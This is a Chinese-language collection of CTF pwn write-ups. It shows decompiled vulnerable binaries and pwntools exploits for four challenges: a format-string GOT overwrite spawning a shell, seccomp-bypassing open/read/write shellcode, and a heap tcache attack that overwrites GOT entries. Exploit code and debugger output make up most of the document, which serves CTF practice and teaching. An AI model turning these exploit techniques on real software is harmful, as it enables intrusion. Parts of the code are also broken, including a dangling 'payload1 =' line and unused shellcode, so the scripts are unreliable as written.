## [SDCTF 2022]Oil Spill

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[312]; // [rsp+10h] [rbp-140h] BYREF
  unsigned __int64 v5; // [rsp+148h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("%p, %p, %p, %p\n", &puts, &printf, s, temp);
  puts("Oh no! We spilled oil everywhere and its making everything dirty");
  puts("do you have any ideas of what we can use to clean it?");
  fflush(stdout);
  fgets(s, 300, stdin);
  printf(s);
  puts(x);
  fflush(stdout);
  return 0;
}
```

这里我先写上的一个比较简单的exp：

```py
from pwn import *
from LibcSearcher import *
context(os='linux', arch='amd64', log_level="debug")
# io=remote('node5.anna.nssctf.cn',25618)
io = process("/home/fofa/OilSpill")
elf=ELF('/home/fofa/OilSpill')
io.recvuntil("0x")
puts_addr=int(io.recv(12),16)
print(hex(puts_addr))
libc=LibcSearcher('puts',puts_addr)
libc_base=puts_addr - libc.dump('puts')
system_addr=libc_base + libc.dump('system')
payload=fmtstr_payload(8,{elf.got['puts']:system_addr,0x600C80:b'/bin/sh\x00'})
print(payload)
payload1 = 
io.sendlineafter("it?",payload)
io.interactive()
```



这里我们使用手写payload,这里的payload是一个思路和尝试

```py
payload1 =b'%'+bytes(str(system_addr & 0xffff), "utf-8")+b'c%10$hnaaa'+ p64(elf.got['puts'])
'''这里是对puts函数的低两位的数据进行一个更改'''
```

gdb调试

```tex
00:0000│ rsp 0x7ffda7e80200 —▸ 0x7ffda7e80478 —▸ 0x7ffda7e82392 ◂— '/home/fofa/OilSpill'
01:0008│-148 0x7ffda7e80208 ◂— 0x1bdaf4e77
02:0010│ rdi 0x7ffda7e80210 ◂— 0x2563303436343325 ('%34640c%')
03:0018│-138 0x7ffda7e80218 ◂— 0x6161616e68243031 ('10$hnaaa')
04:0020│-130 0x7ffda7e80220 —▸ 0x600c18 —▸ 0x7ce5bd887be0 (puts) ◂— endbr64 
05:0028│-128 0x7ffda7e80228 ◂— 0xa /* '\n' */
06:0030│-120 0x7ffda7e80230 ◂— 0x1100000
07:0038│-118 0x7ffda7e80238 ◂— 0x40 /* '@' */


00:0000│ rsp 0x7ffda7e80200 —▸ 0x7ffda7e80478 —▸ 0x7ffda7e82392 ◂— '/home/fofa/OilSpill'
01:0008│-148 0x7ffda7e80208 ◂— 0x1bdaf4e77
02:0010│-140 0x7ffda7e80210 ◂— 0x2563303436343325 ('%34640c%')
03:0018│-138 0x7ffda7e80218 ◂— 0x6161616e68243031 ('10$hnaaa')
04:0020│-130 0x7ffda7e80220 —▸ 0x600c18 —▸ 0x7ce5bd888750 (setvbuf+512) ◂— jmp setvbuf+356
05:0028│-128 0x7ffda7e80228 ◂— 0xa /* '\n' */
06:0030│-120 0x7ffda7e80230 ◂— 0x1100000
07:0038│-118 0x7ffda7e80238 ◂— 0x40 /* '@' */

```

## [HUBUCTF 2022 新生赛]singout

这里我们查看题目发现这个题目就只有一个nc没有附件因此我们直接查看这个文件

```shell
Here is your shell !,get you flag
root@pwn:~# ls
flag.txt
signout
start.sh
root@pwn:~# tac start.sh
root@pwn:~# sh: 1: start.sh: not found
root@pwn:~# tac ./*
root@pwn:~# ./flag.txt: 1: ./flag.txt: NSSCTF{b19ac267-379c-4290-9980-6d70ba63cee8}: not found
root@pwn:~# 

```

## [HGAME 2023 week1]simple_shellcode

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL);
  puts("Please input your shellcode:");
  read(0, (void *)0xCAFE0000LL, 0x10uLL);
  sandbox();
  MEMORY[0xCAFE0000]();
  return 0;
}
```

```shell
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004
 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0004: 0x06 0x00 0x00 0x00000000  return KILL
 
 [*] '/home/fofa/simple_shellcode/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

这里我们就可以知道大部分的信息已经够我们写了，这里我们的思路就非常的明确了1.orw获取flag，2.需要一个read函数

exp:

```py
from pwn import *
context(log_level='debug',arch='amd64', os='linux')
io = remote("node5.anna.nssctf.cn",22072)
# io = process("/home/fofa/simple_shellcode/vuln")

shellcode1=asm('''
mov rdi,rax;
mov rsi,0xCAFE0010;
syscall;
nop;
 ''')

io.sendafter("Please input your shellcode:\n",shellcode1)
shellcode2= asm('''
push 0x67616c66
mov rdi,rsp
xor esi,esi
push 2
pop rax
syscall
mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor eax,eax
syscall
mov edi,1
mov rsi,rsp
push 1
pop rax
syscall
 ''')

io.send(asm(shellcraft.cat("./flag")))
print(io.recv())
print(io.recv())

```

## [TQLCTF 2022]unbelievable write

这里我们查看文件的数据

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      write(1, "> ", 2uLL);
      v3 = read_int();
      if ( v3 != 3 )
        break;
      c3();
    }
    if ( v3 > 3 )
    {
LABEL_10:
      puts("wrong choice!");
    }
    else if ( v3 == 1 )
    {
      c1();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_10;
      c2();
    }
  }
}
```

```c
unsigned __int64 c3()
{
  int fd; // [rsp+Ch] [rbp-54h]
  char buf[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( target != 0xFEDCBA9876543210LL )
  {
    puts("you did it!");
    fd = open("./flag", 0, 0LL);
    read(fd, buf, 0x40uLL);
    puts(buf);
    exit(0);
  }
  puts("no write! try again?");
  return __readfsqword(0x28u) ^ v3;
}
```

```c
void c2()
{
  __int64 v0; // rbx
  int v1; // eax

  if ( golden == 1 )
  {
    golden = 0LL;
    v0 = ptr;
    v1 = read_int();
    free((void *)(v0 + v1));
  }
  else
  {
    puts("no!");
  }
}
```

```c
void c1()
{
  unsigned int size; // [rsp+4h] [rbp-Ch]
  void *size_4; // [rsp+8h] [rbp-8h]

  size = read_int();
  if ( size <= 0xF || size > 0x1000 )
  {
    puts("no!");
  }
  else
  {
    size_4 = malloc(size);
    readline((__int64)size_4, size);
    free(size_4);
  }
}
```

这里我们知道了几个这里几个数据的要给工作原理因此分析一下这个漏洞点

c1:出现了一个malloc的创建size要大于0xf小于0x1000并且创建完成以后会立马free这个chunk

c2：是一个free函数并且存在一个uaf的一个溢出因此我们可以暂时使用这个数据，并且他的free值是通过ptr的数据进行要给偏移量的技术的所以我们这里出现了一个文件溢出的漏洞

c3：这里是一个baekboor的要给漏洞函数要求是target的数据不能和这个相等因此我们就可以通过修改target来进行一个文件的一个获取了

```py
from pwn import *
p = remote("node4.anna.nssctf.cn",28150)
# p = process("/home/fofa/bin/pwn")
context.log_level = "debug"
binary = ELF('/home/fofa/bin/pwn')

target = 0x404080

def backdoor():
    p.sendlineafter("> ","3")

def add(size,content):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.sendline(str(size).encode())
    p.sendline(content)

def free(position):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.sendline(str(position).encode())

#
free('-0x290')
# gdb.attach(p)
add(0x280,b'\x00'*0x10+b'\x01'+b'\x00'*0x6f+p64(0)*8+p64(binary.got['free']))

add(0x90,p64(binary.plt['puts']))#overwrite free got-->puts plt

add(0x280,b'\x00'*0x10+b'\x01'+b'\x00'*0x6f+p64(0)*8+p64(target))
add(0x90,"aaaa")#overwrite target to get flag

backdoor()

p.interactive()
```

思路就是控制文件的一个控制块来进行一个控制



